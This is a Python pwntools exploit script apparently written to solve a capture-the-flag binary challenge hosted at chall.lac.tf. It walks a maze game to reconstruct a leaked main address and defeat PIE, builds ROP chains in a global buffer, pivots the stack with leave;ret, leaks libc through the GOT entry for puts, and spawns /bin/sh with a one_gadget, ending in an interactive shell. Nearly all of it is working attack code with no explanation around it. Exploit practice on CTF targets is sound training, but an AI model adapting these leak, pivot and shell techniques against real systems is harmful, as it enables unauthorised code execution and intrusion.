#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe

nc = "nc chall.lac.tf 31337".split()
HOST = nc[1]
PORT = int(nc[2])

gdbscript = """
b *check_flag_password+375
b *main+931
b *check_flag_password+0x17b
"""

if args.REMOTE:
    r = remote(HOST, PORT)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript)

BOARD_SIZE = 16

ITEM_MAP = {
    'Sword': 0,
    'Shield': 1,
    'Potion': 2,
    'Key': 3,
    'Scroll': 4,
    'Amulet': 5,
    'Crown': 6,
    'Flag': 7
}

grid = [[-1 for _ in range(BOARD_SIZE)] for _ in range(BOARD_SIZE)]

item_positions = [None] * 8

player_x = 0
player_y = 0

MAX_MOVES = 300
moves_made = 0

def send_cmd(cmd):
    r.sendlineafter(b"> ", cmd.encode())
    return r.recvuntil(b"> ", drop=True).decode()

def move(direction):
    global player_x, player_y, moves_made
    moves_made += 1
    r.sendline(direction.encode())
    response = r.recvuntil(b"> ", drop=True).decode()

    if direction == 'n' and player_y > 0:
        if "bump" not in response:
            player_y -= 1
    elif direction == 's' and player_y < BOARD_SIZE - 1:
        if "bump" not in response:
            player_y += 1
    elif direction == 'e' and player_x < BOARD_SIZE - 1:
        if "bump" not in response:
            player_x += 1
    elif direction == 'w' and player_x > 0:
        if "bump" not in response:
            player_x -= 1

    for item_name, item_idx in ITEM_MAP.items():
        if f"spot a {item_name}" in response or f"glimmering {item_name}" in response:
            grid[player_y][player_x] = item_idx
            item_positions[item_idx] = (player_x, player_y)
            log.info(f"Found {item_name} at ({player_x}, {player_y})")

    return response

def check_current_position():
    global moves_made
    moves_made += 1
    r.sendline(b"look")
    response = r.recvuntil(b"> ", drop=True).decode()

    for item_name, item_idx in ITEM_MAP.items():
        if f"glimmering {item_name}" in response:
            grid[player_y][player_x] = item_idx
            item_positions[item_idx] = (player_x, player_y)
            log.info(f"Found {item_name} at ({player_x}, {player_y})")
            return item_idx
    return -1

def all_items_found():
    return all(pos is not None for pos in item_positions)

r.recvuntil(b"> ")

log.info("Starting S-shape maze navigation...")
check_current_position()

exploration_complete = False
for row in range(BOARD_SIZE):
    if row % 2 == 0:
        for _ in range(BOARD_SIZE - 1):
            move('e')
            if all_items_found():
                exploration_complete = True
                break
    else:
        for _ in range(BOARD_SIZE - 1):
            move('w')
            if all_items_found():
                exploration_complete = True
                break

    if exploration_complete:
        break

    if row < BOARD_SIZE - 1:
        move('s')
        if all_items_found():
            exploration_complete = True
            break

if exploration_complete:
    log.success(f"All 8 items found! Short-circuited at row {row}.")
else:
    log.success("Maze navigation complete!")

log.info(f"Exploration used {moves_made} moves, {MAX_MOVES - moves_made} remaining.")

log.info("Discovered grid:")
symbols = ['S', 'H', 'P', 'K', 'L', 'A', 'C', 'F']
for y in range(BOARD_SIZE):
    row_str = ""
    for x in range(BOARD_SIZE):
        if grid[y][x] >= 0:
            row_str += symbols[grid[y][x]] + " "
        else:
            row_str += ". "
    print(f"  {row_str}")

def simulate_placement(addr_bytes_dict):
    sim_board = [[0] * BOARD_SIZE for _ in range(BOARD_SIZE)]
    positions = {}
    for i in range(7, -1, -1):
        if i not in addr_bytes_dict:
            continue
        byte_val = addr_bytes_dict[i]
        x = (byte_val >> 4) & 0x0F
        y = byte_val & 0x0F
        while sim_board[y][x] != 0:
            x = (x + 1) % BOARD_SIZE
            if x == 0:
                y = (y + 1) % BOARD_SIZE
        sim_board[y][x] = i + 1
        positions[i] = (x, y)
    return positions

def find_byte_for_position(item_idx, target_pos, known_bytes):
    for byte_val in range(256):
        test_bytes = known_bytes.copy()
        test_bytes[item_idx] = byte_val
        positions = simulate_placement(test_bytes)
        if positions.get(item_idx) == target_pos:
            return byte_val
    return None

known_bytes = {}
for item_idx in range(7, -1, -1):
    if item_positions[item_idx] is not None:
        target_pos = item_positions[item_idx]
        byte_val = find_byte_for_position(item_idx, target_pos, known_bytes)
        if byte_val is not None:
            known_bytes[item_idx] = byte_val
            log.info(f"Item {item_idx} ({symbols[item_idx]}): pos={target_pos} -> byte=0x{byte_val:02x}")
        else:
            log.warning(f"Item {item_idx}: Could not find matching byte!")
            known_bytes[item_idx] = 0
    else:
        log.warning(f"Item {item_idx} not found!")
        known_bytes[item_idx] = 0

addr_bytes = bytes([known_bytes.get(i, 0) for i in range(8)])

main_addr = u64(addr_bytes)
log.success(f"Reconstructed main address: {hex(main_addr)}")

flag_pos = item_positions[7]

flag_x, flag_y = flag_pos
log.info(f"Flag is at ({flag_x}, {flag_y}), player at ({player_x}, {player_y})")

while player_y < flag_y:
    move('s')
while player_y > flag_y:
    move('n')

while player_x < flag_x:
    move('e')
while player_x > flag_x:
    move('w')

log.success(f"Arrived at Flag position ({player_x}, {player_y})")
log.info(f"Total moves: {moves_made}, {MAX_MOVES - moves_made} remaining.")

# =============================================================================

# Actual hacking begins :)

exe.address = main_addr - exe.sym.main
log.info(f"{hex(exe.address)=}")

# Gadget chain
chain_start = exe.sym.history + 8 * moves_made

def gadget(addr):
    global moves_made
    moves_made += 1
    r.sendlineafter(b"> ", p64(addr)[:6])

def padding():
    global moves_made
    moves_made += 1

    pad = b"A" * (8 - 2)
    r.sendlineafter(b"> ", pad)

# force leave ; ret to keep stack position
moves_made += 1
r.sendline(p64(chain_start + 8 * (5 - 1))[:6])

# printf in print_inventory
printf = exe.address + 0x1480
gadget(printf)
# padding
padding()
# libc leak
gadget(exe.got.puts)
# padding
padding()
# loop main
gadget(exe.sym.main)

# ROP
moves_made += 1
r.sendlineafter(b"> ", b"grab")

# leave ; ret
leave = exe.address + 0x14b7
log.info(f"{hex(leave)=}")

# Stack pivot to .BSS
payload = b"A" * 16 + p64(chain_start) + p64(leave)

r.sendlineafter(b"Password: ", payload)

# libc leak
r.recvuntil(b"0/1094795585 ")
libc_puts = u64(r.recvuntil(b"  ", drop=True).ljust(8, b"\0"))
log.info(f"{hex(libc_puts)=}")

libc.address = libc_puts - libc.sym.puts
log.info(f"{hex(libc.address)=}")

# Gadget chain 2
chain_start = exe.sym.history + 8 * moves_made

# pop rax ; ret
rax = libc.address + 0x00000000000dd237
gadget(rax)
r.sendlineafter(b"> ", b"")
 # pop rbx ; ret
rbx = libc.address + 0x00000000000586e4
gadget(rbx)
r.sendlineafter(b"> ", b"")
"""
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL
"""
one_gadget = libc.address + 0x583ec
gadget(one_gadget)

# ROP
moves_made += 1
r.sendlineafter(b"> ", b"grab")

# Stack pivot 2
payload = b"A" * 16 + p64(chain_start) + p64(leave)

r.sendlineafter(b"Password: ", payload)

r.interactive()
